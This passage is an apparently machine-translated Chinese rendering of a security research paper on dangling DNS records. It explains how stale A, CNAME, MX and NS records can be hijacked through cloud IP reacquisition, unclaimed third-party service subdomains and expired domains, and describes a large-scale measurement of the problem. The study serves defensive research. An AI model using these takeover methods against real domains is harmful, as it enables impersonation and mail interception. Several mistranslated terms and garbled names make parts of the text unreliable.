title="缓解措施"></a><strong>缓解措施</strong></h3><p>我们假设，不安全数据的根本原因是缺乏对DNS记录所指向的短暂资源的真实性检查。因此，我们提出了DNS服务器和第三方服务可以采用的三种机制来减轻不安全的胆量。<br>（1） 我们首先设计了一种机制，允许aDNS服务器对记录指向的这些机器进行身份验证。<br>（2） 对于第三方服务，我们建议通过为服务的每个用户使用一个更安全的独立名称空间来打破悬空的CNAME记录的解析链。<br>（3） 最后，我们主张aDNS服务器应该定期检查DNS记录指向的域的过期情况。</p><h3 id="路线图"><a href="#路线图" class="headerlink" title="路线图"></a><strong>路线图</strong></h3><p>本文的其余部分安排如下：<br>在§2中，我们简要回顾了DNS的背景。<br>在§3中，我们提出了Dare问题和三个攻击向量来利用不安全的DArr。<br>在§4和§5中，我们分别详细介绍了我们的大规模测量研究的方法和结果。<br>在§6中，我们分析了Dares所构成的威胁。<br>在§7中，我们提出了潜在的缓解措施。<br>在§8中，我们调查了相关工作，最后在§9中得出结论。</p><h2 id="0x02-dns-概述"><a href="#0x02-dns-概述" class="headerlink" title="0x02 dns 概述"></a>0x02 dns 概述</h2><p>DNS的结构被组织成一个层次树，如图1所示。第二级（有时是第三级）域由企业或最终用户注册，用于将本地计算资源连接到Internet。任何企业&#x2F;用户都可以拥有一个尚未被其他用户注册的域名。更高级别的域通常称为子域，通常用于指定特定主机，如web和邮件服务器。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%811.jpg" alt="此处输入图片的描述"><br>图1:DNS的层次结构</p><p>域名和IP地址之间的转换称为DNS解析。图2说明了当客户端访问时DNS解析的工作流<a href="http://www.foo.com网站第一次./">www.foo.com网站第一次。</a></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%812.jpg" alt="此处输入图片的描述"><br>图2:DNS解析的工作流<a href="http://www.foo.com./">www.foo.com。</a></p><p>客户机上的存根解析程序查询递归DNS（rDNS）服务器，该服务器可以是本地的也可以是远程的，即在本地网络之外（❶）。在缓存未命中的情况下，rdn将启动查询递归到根服务器.com顶级域（TLD）服务器和foo.com网站(❷ ∼ ❻). 最后，权威服务器foo.com网站将用相应的IP地址响应<a href="http://www.foo.com网站/">www.foo.com网站</a>(❼ ∼ ❽).<br>一旦客户端获得IP地址，就可以连接到网站托管服务器（❾∼❿）</p><p>图3显示了.com TLD服务器和aDNS服务器上的示例记录，如图2所示。DNS数据的每一行表示一个资源记录（RR），它是一个五个元素的数据结构<code>&lt;name，TTL，class，type，data&gt;</code>。<br>字段<code>&lt;name，class，type&gt;</code>用作数据的键，TTL是以秒为单位的生存时间，它决定了缓存的DNS记录的生存期</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%813.jpg" alt="此处输入图片的描述"><br>图3：解析程序上TLD区域文件和DNS记录的示例部分。为了简洁起见，省略了TTL和class字段。</p><h2 id="0x03-悬挂-DNS-记录"><a href="#0x03-悬挂-DNS-记录" class="headerlink" title="0x03 悬挂 DNS 记录"></a>0x03 悬挂 DNS 记录</h2><p>我们的工作受到了利用软件中悬而未决的指针的自由使用漏洞的启发。DNS记录的数据字段本质上是一个指针，如图4所示。在本例中，数据字段1.2.3.4指向承载<a href="http://www.foo.com。稍后，当子域不再需要时，域所有者将释放IP地址。如果域所有者忘记将其从权威DNS服务器中删除，则相应的DNS记录将变为挂起状态。通常，我们将悬挂DNS记录定义为：">www.foo.com。稍后，当子域不再需要时，域所有者将释放IP地址。如果域所有者忘记将其从权威DNS服务器中删除，则相应的DNS记录将变为挂起状态。通常，我们将悬挂DNS记录定义为：</a></p><p><strong>悬挂DNS记录（Dare）</strong><br>如果数据字段指向的资源被释放，则DNS记录<code>r:=&lt;name，TTL，class，type，data&gt;</code>处于挂起状态</p><p>目前，dns rr 有40多种类型。在仔细研究了每种类型dns rr的语义之后，我们确定了<strong>四个安全敏感记录</strong>（如果它们悬空）。这些记录列于表1。显然，并不是所有的 Dares 都容易被利用。例如，给定图4中的Dare-a，如果敌方无法轻松获得IP 1.2.3.4，则该Dare-a是安全的。这里我们进一步定义了不安全的Dare。</p><p><strong>不安的悬挂记录</strong><br>如果废弃的资源可以由控制名称字段的第三方以外的第三方操纵，则Dare是不安全的。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%814.jpg" alt="此处输入图片的描述"><br>表1：安全敏感的悬挂DNS记录类型。†我们的工作目前仅涉及IPv4。‡DNAME在语义上与CNAME相似，因此我们不单独考虑DNAME。</p><p>在下面，我们首先回顾表1中DNS记录的一些关键细节，然后提出攻击者可以利用的三种方法来利用不安全的DARE。</p><h3 id="3-1-安全敏感的记录"><a href="#3-1-安全敏感的记录" class="headerlink" title="3.1 安全敏感的记录"></a>3.1 安全敏感的记录</h3><p><strong>悬挂A记录</strong><br>A记录将域名映射到IPv4地址。<br>对A记录的name字段的所有请求都将被定向到IP地址的主机并由其处理。因此，如果IP地址可能被原始域名所有者以外的第三方获取，则域名将受到损害</p><p><strong>悬挂CN 记录</strong></p><p>CNAME记录指定域名是另一个域名的别名，即“规范”域名。例如，<a href="http://www.foo.com网站图3是其别名的规范域名,bar.example.com网站/">www.foo.com网站图3是其别名的规范域名，bar.example.com网站</a>. 对别名的请求将解析为其规范域名，该域名进一步解析为A记录。注意，利用Dare-CN与利用Dare-A具有几乎相同的效果。</p><p><strong>悬挂 MX 记录</strong></p><p>MX记录指定负责<strong>代表域接受电子邮件的邮件服务器</strong>。在多个MX记录的情况下，<strong>用户可以为每个记录设置一个优先级</strong>，并且将首先使用<strong>值最低</strong>（即最高优先级）的服务器。在下面的示例中，电子邮件客户端将首先联系a 邮件还有b 邮件（通常以循环的方式）；如果两者都没有响应然后联系c邮件。请注意，MX记录不是接收电子邮件所必需的。<strong>当不使用MX时，域的A记录</strong>（例如。foo.com)<strong>将被视为隐含的MX</strong><a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%8113.jpg">14</a>。如果可以利用Dare MX，则对手可能能够在该易受攻击的域中发送和接收电子邮件。</p><pre><code class="hljs">foo.com. 60 MX 10 a.mail.com.foo.com. 60 MX 10 b.mail.com.foo.com. 60 MX 20 c.mail.com.</code></pre><p><strong>悬挂 NS 记录</strong></p><p><strong>NS记录将一个域委托给aDNS服务器，以回答关于该域下名称的查询</strong>。还存在一个A记录来为aDNS服务器提供IP地址，这被称为glue记录。<strong>通常，有多个NS记录服务于一个域</strong>，解析程序需要选择一个aDNS服务器进行进一步查询。aDNS服务器选择[57]可以是<br>（1）命中第一个服务器，<br>（2）随机选择一个，或<br>（3）根据本地定义的规则（如RTTs）对记录进行排序。<br>为了迫使DNS解析程序使用DareNS，攻击者可以利用多种技术，如拒绝服务攻击和NS pinning[39]。如果一个darens可以被利用，对手将建立一个恶意的adns并将访问者定向到任何IP地址。由于DNS中的传递信任[53]，darens的影响被放大到所有直接或间接依赖它的域。</p><h3 id="3-2-云中的-IP"><a href="#3-2-云中的-IP" class="headerlink" title="3.2 云中的 IP"></a>3.2 云中的 IP</h3><p>表1中的每个数据最终被解析为一个IP地址，因此敌方可以直接获得IP地址来利用不安全的数据。例如，如果对手可以获得图4中的1.2.3.4，则所有后续请求<a href="http://www.foo.com网站然后由对手来处理.ip地址能否获得在很大程度上取决于域的托管方式./">www.foo.com网站然后由对手来处理。IP地址能否获得在很大程度上取决于域的托管方式。</a></p><p>图5展示了现代域托管的三种典型范例。在第一种情况下，一个域托管在一台专用计算机上，该计算机具有从域所有者拥有的地址块分配的IP。许多像大学这样的大型组织在其大部分领域都采用这种模式。然而，大多数人负担不起专门的托管，他们通常使用第三方服务（如GoDaddy<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%8110.jpg">11</a>）来托管自己的域名。在这些第三方服务的正常配置中，<strong>许多域托管在共享同一IP地址的单个服务器上</strong>。用户只拥有和控制服务器上分配的存储空间。<strong>在这两种范例中，Dare-a通常是安全的</strong>，因为敌方无法轻易获得Dare-a指向的IP地址。</p><p>然而，<strong>现在越来越多的域被迁移到云上</strong>。特别是，客户可以从共享IP地址池获取任何公共IP地址。虽然IP分配应该是随机的，但<strong>恶意客户可以通过反复分配和释放IP地址来获得所需的IP地址</strong>。因此，我们关注的是Dare-A在云环境中的安全威胁，特别是两个最流行的云平台Amazon EC2<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%812.jpg">2</a>和microsoftazure<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%8116.jpg">17</a>。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%815.jpg" alt="此处输入图片的描述"></p><p><strong>Amazon EC2</strong></p><p>在amazonec2中，用户可以租用虚拟机（实例）并运行自己的应用程序。默认情况下，当实例启动时，会给它分配一个公共IP地址；当实例终止时，它会释放分配的IP地址。EC2还提供弹性IP，一个分配给用户帐户的持久公共IP地址。弹性IP在用户释放之前一直由用户持有。</p><p>一旦一个弹性IP被释放，它将被EC2回收并立即重新分配给其他用户。每个接收公共IP地址的实例也会以ec2-{IP}.compute-1的形式给出一个外部主机名。亚马逊网站. 此外，EC2目前提供两种平台：EC2 Classic和EC2-VPC<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%813.jpg">3</a>。虽然它们在许多方面有所不同，但对我们来说最重要的区别是一个单独的公共IP地址池被用于每种类型的平台。亚马逊[24]指出，2013年12月4日之后创建的所有EC2账户只能使用EC2-VPC，而EC2 Classic仅适用于以前按地区使用过EC2-VPC的账户。</p><p>一旦获得云中的公共IP地址，用户可以使用CNAME或记录将其域资源（例如，web服务器）指向IP地址，如图6所示。一旦敌方成功获得Dare-a的IP地址，他们就可以随意模拟域资源，而不管域资源驻留在哪个EC2平台，以及它使用哪种DNS记录来指向。</p><p><strong>Microsoft Azure.</strong></p><p>与EC2类似，Azure上的公共IP地址也分为两类：动态和保留。动态IP在其相关资源（如虚拟机）分别启动和终止时分配和释放。为了防止IP地址的更改，用户可以显式地保留一个IP地址，即静态IP地址。我们的测量表明，这两种类型的公共IP地址都是从同一个IP地址池中分配的，并且其中任何一种在释放后立即可重新分配。此外，动态IP可以根据用户的需求转换为保留IP。</p><p>最后，为了将域资源指向Azure上的公共IP地址，应用相同的简单技术（即使用CNAME或记录）。</p><h3 id="3-3-废弃的第三方服务"><a href="#3-3-废弃的第三方服务" class="headerlink" title="3.3 废弃的第三方服务"></a>3.3 废弃的第三方服务</h3><p>现代网站广泛使用第三方服务。例如，他们可能使用Mailgun<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%8115.jpg">16</a>来发送电子邮件，使用Shopify[22]来建立在线零售点系统和商店。<strong>这些服务通常为用户提供相应服务所在的子域</strong>。例如，当用户Alice从shoppify订阅服务时，她将被分配一个子域名，alice.myshopfify.com网站，因此她的在线商店可以通过这个子域访问。然而，在大多数情况下，人们更喜欢在自己的域名下拥有自己的店铺。为此，每个第三方服务允许用户使用A或CNAME记录将其（子）域指向服务提供的资源。在Shopify的例子中，Alice可以设置她的adn，如下所示：</p><pre><code class="hljs">shop.Alice.com A 23.227.38.32(or) shop.Alice.com CNAME alice.myshopify.com</code></pre><p>此外，Shopify的DNS服务器将所有用户的子域解析为一个专用域：</p><pre><code class="hljs">*.myshopify.com CNAME shops.shopify.com</code></pre><p>因为Shopify的所有自定义域都指向同一个IP地址（23.227.38.32）或同一个域(shops.shopify.com)，Alice还需要声明shop.Alice.com商店在她的shoppify帐户上。这样，爱丽丝的商店就可以通过shop.Alice.com商店.</p><p>稍后，当Alice不想再使用Shopify时，她可以停止服务并清除上面的DNS记录。但是，如果她忘了打扫卫生，shop.Alice.com商店将继续解决shops.shopify.com因为大多数服务使用通配符来解析特定于用户的子域（就像shoppify那样）。</p><p>如果一个对手，恶意，知道了shop.Alice.com指向商店化，他可以声称它的所有权。如果Shopify不验证索赔，这是大多数服务中的常见做法，恶意现在可以控制子域，shop.Alice.com.</p><p>电子邮件服务的情况与此过程类似。唯一的区别是用户添加MX记录而不是CNAME记录来接收电子邮件。</p><p>验证域所有权可以防止上述攻击。然而，在某些情况下，如果不是不可行的话，核查费用太高。例如，Azure云服务使用用户指定的子域命名方案。考虑到Azure用户的域名规模过大，以前使用的所有域名验证成本都很高。</p><p>总而言之，要使这次攻击成功，需要：</p><ul><li>易受攻击的域可以<strong>解析为一个公共目标</strong>（例如，IP地址或域名），第三方服务不会验证易受攻击域的所有权；或者</li><li>易受攻击的域解析为任何用户都可以在可用时获取的自定义目标。</li></ul><h3 id="3-4-过期的域"><a href="#3-4-过期的域" class="headerlink" title="3.4 过期的域"></a>3.4 过期的域</h3><p>CNAME、MX和NS记录的数据字段可能指向过期的域。对手可以重新注册和滥用过期的域名。我们的攻击不同于以往的工作[46]、[49]、[50]，它们主要利用过期域的剩余信任，而我们的攻击则滥用指向过期域的未过期（子）域的信任。这些过时的记录普遍被域管理员忽略，因为（1）可能有辅助记录作为故障转移的手段（例如，多个MX和NS记录）；以及（2）链接到过期域的服务不再使用，也没有人关心更新它们。</p><h3 id="3-5-总结"><a href="#3-5-总结" class="headerlink" title="3.5 总结"></a>3.5 总结</h3><p>总的来说，我们已经证明了几种类型的Dares 可以通过多种方式被利用。表2总结了每种类型的Dare易受攻击的攻击向量</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%818.jpg" alt="此处输入图片的描述"><br>表2：每种类型的Dare易受攻击的攻击向量摘要</p><h2 id="0x04-测量方法学"><a href="#0x04-测量方法学" class="headerlink" title="0x04 测量方法学"></a>0x04 测量方法学</h2><p>为了评估Dares问题的严重性，我们进行了一个大规模的测量研究。我们的度量方法的概述如图7所示。我们试图回答以下两个问题：（1）每种Dares在野外的流行程度如何？以及（2）Dares的安全含义是什么？</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%817.jpg" alt="此处输入图片的描述"><br>图7：方法概述。</p><h3 id="4-1-域集合"><a href="#4-1-域集合" class="headerlink" title="4.1 域集合"></a>4.1 域集合</h3><p>为了全面检测dare，理想的方法是收集所有apex域及其子域的DNS数据。然而，扫描所有域是不切实际的。由于只有流行的数据集才可能构成严重的威胁，所以我们构建表3中列出的数据集。我们首先得到一个顶点域的列表。在这里我们选择了Alexa从2010年到2016年每年100万个域名列表的快照。这些顶级域名特别有吸引力，因为如果一个热门域名的对手能够控制它，它将提供更高的价值。</p><p>这个域的集合表示为D。请注意，我们的数据集D本质上不同于[46]中研究的过期域。在过期域的情况下，所有解析程序中的DNS记录都被清除，导致没有悬挂</p><p>得到顶点域的完全子域也是非常重要的。由于大多数apex域不允许DNS区域传输（即AXFR类型的DNS查询），我们决定使用暴力扫描来构建我们的子域列表。然而，扫描所有排名前100万的域名是不切实际的。为了便于管理，我们将搜索空间限制在前10000个域名、2700个.edu域和1700个前100万个域名列表中。我们首先向每个域发出DNS区域传输查询，然后成功地收集了320个域的区域数据。基于区域转移的结果，我们构造了一个大小为20000的词列表，用于暴力扫描。</p><p>区域传输结果还显示通配符记录（例如*）。foo.com网站)在实践中得到了广泛的应用。在我们的暴力扫描中，我们小心地消除不存在的子域。在这个过程中，我们向大约2.88亿个有效子域发送DNS查询，成功获得约57万个子域。此子域数据集表示为S&#x3D;St∪Se∪Sg。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%8117.jpg" alt="此处输入图片的描述"><br>表3：领域评估集</p><h3 id="4-2-DNS数据检索"><a href="#4-2-DNS数据检索" class="headerlink" title="4.2 DNS数据检索"></a>4.2 DNS数据检索</h3><p>然后我们使用DNS工具dig来检索D和S中每个域的DNS记录，我们只收集其类型如表1所示的DNS记录。对于除记录之外的这些类型的DNS记录，我们递归地对数据字段中的主机名发出DNS查询，直到查询到达（或未能到达）A记录。</p><p>{rtypd，因此我们在解析每个域的数据类型d时，得到一个。，rtypei（数据i−1，datai）}。<br>该数据集表示为DREC&#x3D;S RCd。</p><h3 id="4-3-寻找悬挂"><a href="#4-3-寻找悬挂" class="headerlink" title="4.3 寻找悬挂"></a>4.3 寻找悬挂</h3><p>在完成DNS数据采集后，使用算法1自动搜索四种类型的数据。给定一个域的解析链，我们递归地检查链中每个DNS记录的数据字段，如算法1的第7、9、12、15和19行所示。数据类型由链的第一个DNS记录的类型决定。接下来我们将详细描述如何实现这些检查。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%8118.jpg" alt="此处输入图片的描述"></p><h4 id="4-3-1-检查A记录（第7行和第9行）"><a href="#4-3-1-检查A记录（第7行和第9行）" class="headerlink" title="4.3.1 检查A记录（第7行和第9行）"></a>4.3.1 检查A记录（第7行和第9行）</h4><p>EC2和Azure都发布了它们的公共IP范围<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%814.jpg">4</a>，[18]。<br>但是，我们仍然无法知道给定的IP是否在特定时间是可分配的。几乎所有云平台（包括EC2和Azure）都会随机分配IP地址，并且不允许用户指定要分配的IP。获得一个理想的IP是一项具有挑战性的任务。我们从以下两个方面来研究这个问题：</p><ul><li>我们量化了攻击者是否以及如何通过侦察IP池来克服随机IP分配以获得所需IP。</li><li>然后我们评估野外利用的潜在数量。</li></ul><p><strong>侦察IP池</strong></p><p>我们实现了一个简单的工具IPScouter，从EC2和Azure获取IP地址。由于EC2为EC2 Classic和EC2-VPC使用两个独立的地址池，因此我们设置最多两个ipscouter，每个地址池一个。IPScouterVPC随机请求所有当前可用区域的ip[20]。IPScouter Classic要求us-east-1提供IP，因为我们的客户只能在该地区支持EC2 Classic。在这两种设置中，只有弹性IP通过boto的<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%818.jpg">6</a>API allocate_地址进行分配。此外，ipscouterazure还请求ServiceManagementService返回的区域中的ip。<br>列出位置（）<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%815.jpg">5</a>。静态IP地址是使用create_reserved_IP_address（）保留的。在此进程中没有启动虚拟机或服务。</p><p>获取的IP地址在登录到ALLOCIP（算法1的输入）后立即释放。最后，由于所有云都以每个帐户为基础限制查询API请求，所以ipscouter使用指数退避线性恢复策略来控制请求速率。</p><p><strong>野外的潜在悬挂</strong></p><p>我们的IPScouter本质上是概率的，许多因素可能会影响挤奶IP的完整性。在我们的研究中，我们可能找不到所有想要的IP。例如，云平台可能会将一部分IP范围保留一段时间。因此，我们扫描DREC中的所有IP，以评估野外可利用的Dare。我们的基本假设是，<strong>如果云中的IP不存在，它可能已经被释放</strong>。在EC2和Azure中，使用中的IP不需要花费任何费用，但是用户应该为未使用的IP付费。因此，我们认为这一假设在总体上是有效的。给定一组记录R&#x3D;{r1，r2，···，rn}，<code>ri=&lt;namei，IPi&gt;</code>和i∈[1，n]，我们根据以下步骤（算法1第9行）检查它们是否是潜在的Dares：</p><p>第1步。如果IPi不在云中，请删除ri。</p><p>第2步。我们将根据名称字段删除所有不太可能挂起的记录。例如，一条记录可能指向构建在现有IaaS基础设施（如负载平衡）之上的特定服务。这些记录通常由云DNS服务器管理。如果DNS解析成功，则表示IP未释放。</p><p>第3步。我们使用ZMap扫描剩余的记录[34]。为了减少扫描流量，我们使用一组启发式方法对端口进行优先级排序。例如，默认情况下，HTTP和HTTPS的端口排名第一。如果name字段以ns开头，则可能是DNS服务器，因此我们首先使用TCP和UDP扫描端口53。请注意，我们在一个月后对所有非活动IP地址进行第二次扫描，以确保它们不是瞬时故障。</p><p>第4步。在这一步，所有剩余的记录可能都是DARE，因为它们与这些未使用的IP地址相关联。我们进一步检查存档.org对是否可以找到namei的存档网页获得更多信心（见§5.2）。</p><h4 id="4-3-2-检查废弃服务（15-行）"><a href="#4-3-2-检查废弃服务（15-行）" class="headerlink" title="4.3.2 检查废弃服务（15 行）"></a>4.3.2 检查废弃服务（15 行）</h4><p>我们首先确定一个受欢迎的第三方服务列表。为此，我们根据CNAME和MX记录的数据字段对其进行聚类，然后根据群集大小手动检查所有电子邮件和前200个非电子邮件服务。选择一个服务进行进一步检查，以确定它是否（1）满足§3.3中的两个要求之一（即，使用该服务的域容易受到安全敏感数据的攻击）和（2）提供免费或免费试用帐户，以便我们进一步检查。如表4所示，只有一个电子邮件和八个非电子邮件服务满足这两个先决条件，并被选中进行进一步检查。这些未经选择的服务大多不向个人提供免费帐户，使他们无法进一步检查。对于非电子邮件服务，只有Google<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%8111.jpg">12</a>和Aliyun<a href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%811.jpg">1</a>等几种服务执行所有权验证。相比之下，我们发现只有一个电子邮件服务不强制所有权验证。这可能是因为大多数电子邮件服务提供商试图防止他们的服务在垃圾邮件和网络钓鱼中被滥用。一种常见的验证实践要求域所有者将随机的CNAME或TXT记录包括到他们的adn记录中。由于我们假设对手无法控制域的ADN，这样的验证将能够挫败所有攻击尝试。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%819.jpg" alt="此处输入图片的描述"><br>表4：评估的第三方服务。</p><p>然后，为了自动找到无人认领的域，我们利用Selenium[21]来构建一个自动化工具，这个工具可以自动进行web浏览。请注意，我们可以通过简单地查找这些数据字段未能解析为A记录的CNAME记录，轻松地在Azure中挑出无人认领的域。不需要使用自动工具，因为这些CNAME记录的名称字段中的域在Azure云服务中应该是无人认领的。</p><h4 id="4-3-3-正在检查过期的域（第12行和第19行）"><a href="#4-3-3-正在检查过期的域（第12行和第19行）" class="headerlink" title="4.3.3 正在检查过期的域（第12行和第19行）"></a>4.3.3 正在检查过期的域（第12行和第19行）</h4><p>检查域是否已过期很简单。我们首先根据WHOIS的响应筛选出过期的域。<br>对于过期域，WHOIS的响应应为null。<br>因为WHOIS并不总是可靠的，因此我们会与流行的Internet域注册器（如GoDaddy）交叉检查，以验证是否可以重新注册域。</p><h3 id="4-4-局限性"><a href="#4-4-局限性" class="headerlink" title="4.4 局限性"></a>4.4 局限性</h3><p>虽然我们的工作能够在野外找到可利用的胆子，但我们无法知道是否以及有多少网站已经被利用。例如，一个过期的域可能已经被攻击者注册。此外，我们的研究目前只涉及两个云平台和九个第三方服务。然而，Dare问题应该在许多云平台和第三方服务中普遍存在。</p><h3 id="4-5-测量结果"><a href="#4-5-测量结果" class="headerlink" title="4.5 测量结果"></a>4.5 测量结果</h3><p>在本节中，我们证明了DARE的问题是普遍存在的，甚至在那些管理良好的区域，如edu和gov。我们首先描述了在我们的测量研究中发现的DARE的一般特征，然后分析了关于三个攻击向量的测量结果。</p><h2 id="0x05-悬挂特性"><a href="#0x05-悬挂特性" class="headerlink" title="0x05 悬挂特性"></a>0x05 悬挂特性</h2><p>图8显示了在表3中列出的四个数据集中找到的数据的数量。在这个图中，我们只统计ipscouter（即确认的dare）成功获得的IP地址。其余的潜在挑战如图9所示。<br>对于数据集S，同一域区域中的多个数据分别计数。我们在野外总共发现了791个和5982个潜在的。我们可以看到，所有四个数据集中都存在dare，这表明存在一个广泛的问题。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%8110.jpg" alt="此处输入图片的描述"><br>图8：每个数据集的已确认数据量。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%8111.jpg" alt="此处输入图片的描述"><br>图9：潜在的悬挂。</p><p>可见，在野外已确认和潜在的Dare中，Dare-A和Dare-CN的总数占了绝大多数。这是因为A和CNAME记录在实践中使用最为频繁。对于apex域，超过90%的adnse委托给第三方服务，如GoDaddy[37]。当托管资源在一个网站关闭后被释放时，它的adn通常仍然是活动的，并且所有的DNS记录都不太可能被删除，因为域本身还没有到期。子域的A和CNAME记录通常链接到域或外部服务支持的新资源，这些资源的生命周期通常相对较短，有时可以迁移出去。由于这些子域的高流失率，它给域名所有者带来了一个繁琐的负担，手动保持他们的aDNS服务器更新和一致性-</p><p>因此，在实践中，这些过时的DNS记录通常不会被清除，从而导致dare。注意，数据集D中的数据中心数目相对较少，因为通常不建议将CNAME记录保存在apex域中。</p><p>daremx主要是由于服务被放弃造成的，只有dataset D有实例可以被其他两个向量利用。在检查了这些特殊实例之后，我们发现D中的域倾向于使用多个MX记录来指向不同的域。例如，域的DNS记录自定义girl.com包括</p><pre><code class="hljs">customizedgirl.com@ns-1057.awsdns-04.org.:customizedgirl.com. 60 MX 10 bridalpartytees.com.customizedgirl.com. 60 MX 10 customizedgirl.com.customizedgirl.com. 60 MX 10 shoplattitude.com.</code></pre><p>这里三个MX记录指向三个具有相同优先级的不同域。我们发现第三个，shoplattitude.com网站，已过期。我们推测这是一个错误，实际上应该是shoplatitude.com网站. 由于解析程序以循环方式使用这三条记录中的每一条记录，因此域所有者很难快速意识到失败的记录。相比之下，在一个更好管理的域（如数据集S中的记录）中的所有MX记录通常指向同一域的不同邮件服务器。</p><p>最后，在我们的测量中只发现了四个darens实例，它们都在数据集D中。所有实例都有相同的错误配置模式，下面是一个例子。</p><pre><code class="hljs">bedshed.com.au@ns1.partnerconsole.net:bedshed.com.au. 3600 NS ns2.r2design.com.au.bedshed.com.au. 3600 NS ns1.r2design.com.au.</code></pre><p>使用带有+trace选项的dig实用程序，我们发现。com.au公司TLD是ns1。partnerconsole.net，但NS记录不会更新，仍然指向过期的域。野生环境中darens的少量存在可能是因为NS记录更为关键，并且很容易发现错误配置。此外，大多数域已将adn迁移到第三方服务[37]，这些服务通常具有管理良好的服务器。不幸的是，这种迁移也成为Dare的一个常见原因，可以通过云中的IP进行利用（见§5.2）。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%8112.jpg" alt="此处输入图片的描述"></p><p>对于数据集S，表5显示了每种数据类型的不同顶点域的数量。总的来说，我们在Alexa的前10000个领域中识别了277个不同的域，52个在edu区，6个在gov区。<br>特别是，St中的域覆盖了许多类型的网站，如图10所示。我们的研究结果表明，几乎所有类型的网站都存在胆敢行为，因此会造成严重的损害。</p><h3 id="5-2-云内-IP"><a href="#5-2-云内-IP" class="headerlink" title="5.2 云内 IP"></a>5.2 云内 IP</h3><p>我们现在分析两个云平台上第一个攻击向量的测量结果：amazonec-2和microsoftazure。</p><p><strong>IPSCOUTER的性能</strong></p><p>图11显示了一段时间内ipscouter获得的不同IP地址的数量。IPScouterClassic和IPScouter Azure持续14天，IPScouter VPC持续26天。对于EC2-VPC和Azure，这个数字呈线性增长，每天分别大约获得5000个和2200个新的IP地址</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%82%AC%E6%8C%82%E5%9F%9F%E5%90%8D%E7%9A%84%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%8113.jpg" 